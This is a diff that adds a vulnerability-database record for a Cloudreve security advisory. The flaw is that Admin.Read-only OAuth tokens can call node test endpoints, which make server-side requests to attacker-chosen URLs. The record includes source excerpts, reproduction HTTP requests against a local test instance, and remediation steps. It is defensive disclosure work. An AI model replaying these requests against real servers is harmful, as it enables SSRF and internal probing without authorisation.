@@ -1,0 +1,183 @@
+[basic]
+description = '''
+## Summary
+
+Cloudreve exposes two admin node test endpoints under the `Admin.Read` OAuth scope. These endpoints accept attacker-controlled node definitions and cause Cloudreve to make outbound server-side network requests. This allows an OAuth client authorized only for `Admin.Read` to trigger operational network actions that should require `Admin.Write`.
+
+## Impact
+
+An attacker who obtains an admin-authorized OAuth token with `Admin.Read` but not `Admin.Write` can make the Cloudreve server connect to arbitrary URLs supplied in the request body. This can be used for blind SSRF, internal service probing, and triggering signed Cloudreve slave-style requests to attacker-chosen endpoints.
+
+## Affected version
+
+Verified in source and runtime on latest master commit `ba2e870bbd17f1918dd2321de861e453f696d6a3` and latest observed tag `4.16.1`.
+
+## Technical details
+
+The authenticated admin route group requires only `Admin.Read`:
+
+```go
+auth := v4.Group(\"\")
+auth.Use(middleware.LoginRequired())
+auth.Use(middleware.RequiredScopes(types.ScopeAdminRead))
+admin := auth.Group(\"admin\", middleware.IsAdmin())
+```
+
+The following routes are registered without `ScopeAdminWrite`:
+
+```go
+node.POST(\"test\",
+    controllers.FromJSON[adminsvc.TestNodeService](adminsvc.TestNodeParamCtx{}),
+    controllers.AdminTestSlave,
+)
+node.POST(\"test/downloader\",
+    controllers.FromJSON[adminsvc.TestNodeDownloaderService](adminsvc.TestNodeDownloaderParamCtx{}),
+    controllers.AdminTestDownloader,
+)
+```
+
+By contrast, node create, update, and delete routes do require `Admin.Write`:
+
+```go
+node.PUT(\"\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+node.PUT(\":id\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+node.DELETE(\":id\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)
+```
+
+`TestNodeService.Test()` parses the attacker-supplied node server and sends a request to it:
+
+```go
+slave, err := url.Parse(service.Node.Server)
+...
+res, err := r.Request(
+    \"POST\",
+    routes.SlavePingRoute(slave),
+    bytes.NewReader(bodyByte),
+    ...
+)
+```
+
+`TestNodeDownloaderService.Test()` constructs a downloader from attacker-supplied node settings and invokes its network test method.
+
+## Reproduction
+
+The following was verified against a disposable Cloudreve instance built from the affected commit.
+
+Prerequisite: an admin user authorizes an OAuth client with `Admin.Read` but not `Admin.Write`.
+
+1. Obtain an OAuth access token whose scope is only:
+
+```text
+openid Admin.Read
+```
+
+The returned token response contains:
+
+```json
+{
+  \"token_type\": \"Bearer\",
+  \"scope\": \"openid Admin.Read\"
+}
+```
+
+2. Confirm the token cannot perform an `Admin.Write` node operation:
+
+```http
+PUT /api/v4/admin/node HTTP/1.1
+Authorization: Bearer <admin-read-oauth-token>
+Content-Type: application/json
+
+{
+  \"node\": {
+    \"name\": \"deny-control\",
+    \"server\": \"http://127.0.0.1:18080\",
+    \"type\": \"slave\",
+    \"slave_key\": \"poc\"
+  }
+}
+```
+
+Observed response:
+
+```json
+{
+  \"code\": 40089,
+  \"msg\": \"Insufficient scope: Admin.Write\"
+}
+```
+
+3. Use the same `Admin.Read`-only OAuth token to call the node test endpoint with an attacker-controlled server URL:
+
+```http
+POST /api/v4/admin/node/test HTTP/1.1
+Authorization: Bearer <admin-read-oauth-token>
+Content-Type: application/json
+
+{
+  \"node\": {
+    \"id\": 124,
+    \"name\": \"ssrf-poc\",
+    \"server\": \"http://127.0.0.1:18080\",
+    \"type\": \"slave\",
+    \"slave_key\": \"attacker-controlled-key\"
+  }
+}
+```
+
+Observed Cloudreve response:
+
+```json
+{
+  \"code\": 0,
+  \"msg\": \"\"
+}
+```
+
+4. The canary server at `127.0.0.1:18080` received the backend request:
+
+```http
+POST /api/v4/slave/ping HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Cloudreve/4.14.0
+Authorization: Bearer Cr <hmac-signature>:<timestamp>
+X-Cr-Node-Id: 124
+X-Cr-Site-Url: http://127.0.0.1:15212
+Content-Length: 37
+
+{\"callback\":\"http://127.0.0.1:15212\"}
+```
+
+This proves the `Admin.Read`-only OAuth token is denied on a sibling `Admin.Write` route but can still trigger a server-side request to an attacker-selected node URL through the test route.
+
+## Root cause
+
+The route group enforces `Admin.Read` by default and relies on per-route `Admin.Write` middleware for operations that mutate state or perform operational side effects. The node test endpoints were omitted from the `Admin.Write` set even though they execute server-side network actions using attacker-supplied configuration.
+
+## Remediation
+
+- Add `middleware.RequiredScopes(types.ScopeAdminWrite)` to both node test routes.
+- Consider applying SSRF validation or network egress controls to all admin-supplied test URLs.
+- Audit other admin test endpoints for read-scoped side effects.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Cloudreve Admin.Read OAuth tokens can trigger server-side node test requests"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-v6w6-358x-2433"]
+ave_id = "AVE-2026-1211"
+
+[meta]
+collected_at = "2026-08-06T13:22:06.560590959+00:00"
+status = "completed"
+
+[references]
+urls = []
